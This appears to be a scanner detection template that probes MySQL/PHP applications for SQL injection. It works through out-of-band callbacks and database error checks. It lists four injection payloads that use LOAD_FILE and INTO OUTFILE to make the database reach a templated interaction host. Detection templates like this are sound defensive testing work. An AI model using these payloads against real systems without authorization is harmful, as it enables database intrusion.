id: "sqli-oob-mysql"
issue_code: sql_injection
detection_condition: or
detection_methods:
  - oob_interaction:
      oob_address: "{{.oob_address}}"
      confidence: 95
  - response_check:
      check: database_error
      confidence: 85
vars:
  - name: oob_address
    value: "{{interactionAddress}}"
launch:
  operator: or
  conditions:
    - type: platform
      value: mysql
    - type: platform
      value: php
    - type: scan_mode
      value: fuzz
templates:
  - "' AND LOAD_FILE('\\\\{{.oob_address}}\\a')--"
  - "' UNION SELECT LOAD_FILE('\\\\{{.oob_address}}\\a')--"
  - "1' AND LOAD_FILE('\\\\{{.oob_address}}\\a')--"
  - "' UNION SELECT 'a' INTO OUTFILE '\\\\{{.oob_address}}\\a'--"
categories:
  - sql_injection
  - oob
  - mysql
platforms:
  - mysql
  - php
